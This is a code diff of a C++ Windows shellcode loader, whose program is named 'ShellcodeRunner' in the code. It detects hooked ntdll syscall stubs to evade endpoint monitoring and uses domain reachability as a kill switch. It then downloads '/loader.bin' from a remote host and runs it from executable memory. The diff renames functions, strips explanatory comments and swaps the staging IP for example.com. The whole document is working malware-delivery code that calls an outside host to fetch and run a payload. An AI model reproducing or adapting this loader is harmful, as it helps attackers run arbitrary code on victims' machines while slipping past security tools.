@@ -8,7 +8,7 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-bool IsHookedFunction(PVOID functionAddress)
+bool HookedFunc(PVOID functionAddress)
 {
     // Syscall stubs start with these bytes in ntdll
     unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };
@@ -26,10 +26,10 @@ bool IsHookedFunction(PVOID functionAddress)
     return true; 
 }
 
-bool isSyscallHooked() {
+bool SyscallHooked() {
     bool syscallHooked = false;
 
-    // List of functions to be ignored during verification
+    // List of functions to ignore during verification
     std::set<std::string> ignoreList = {
         "NtGetTickCount",
         "NtQuerySystemTime",
@@ -78,7 +78,7 @@ bool isSyscallHooked() {
 
         // Only interested in Nt|Zw functions
         if (strncmp(functionName, "Nt", 2) == 0 || strncmp(functionName, "Zw", 2) == 0) {
-            if (IsHookedFunction(functionAddress)) {
+            if (HookedFunc(functionAddress)) {
                 printf("Hooked or modified: %s : %p\n", functionName, functionAddress);
                 syscallHooked = true; // Mark as hooked if any function is modified
             }
@@ -92,7 +92,7 @@ bool isSyscallHooked() {
     return syscallHooked;
 }
 
-bool isDomainOnline(const wchar_t* domain) {
+bool DomainOnline(const wchar_t* domain) {
     HINTERNET hSession = WinHttpOpen(L"ShellcodeRunner", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
 
@@ -176,23 +176,20 @@ bool downloadShellcode(const wchar_t* domain, const wchar_t* path, const wchar_t
 
 
 int main() {
-    const wchar_t* domain = L"192.168.15.47"; // Replace with the real domain
+    const wchar_t* domain = L"example.com"; 
     const wchar_t* path = L"/loader.bin";
     const wchar_t* outputFilePath = L"C:\\Windows\\Temp\\shellcode.bin";
 
-    // Kill-switch: Check if the domain is online
-    if (!isDomainOnline(domain)) {
+    if (!DomainOnline(domain)) {
         std::cerr << "Domain offline\n";
         return 1;
     }
 
-    // Kill-switch: Detect syscall hooks
-    if (isSyscallHooked()) {
+    if (SyscallHooked()) {
         std::cerr << "Syscall hooks detected\n";
         return 1;
     }
 
-    // Download the shellcode
     if (!downloadShellcode(domain, path, outputFilePath)) {
         std::cerr << "Failed to download the shellcode\n";
         return 1;
@@ -214,17 +211,14 @@ int main() {
         return 1;
     }
 
-    // Allocate executable memory
     void* execMemory = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!execMemory) {
         std::cerr << "Failed to allocate memory\n";
         return 1;
     }
 
-    // Copy the shellcode into the allocated memory
     memcpy(execMemory, buffer.data(), size);
 
-    // Change memory protection to executable
     DWORD oldProtect;
     if (!VirtualProtect(execMemory, size, PAGE_EXECUTE_READ, &oldProtect)) {
         std::cerr << "Failed to change memory protection\n";
@@ -232,11 +226,9 @@ int main() {
         return 1;
     }
 
-    // Execute the shellcode
     auto shellcodeFunc = reinterpret_cast<void(*)()>(execMemory);
     shellcodeFunc();
 
-    // Clean up memory
     VirtualFree(execMemory, 0, MEM_RELEASE);
 
     return 0;
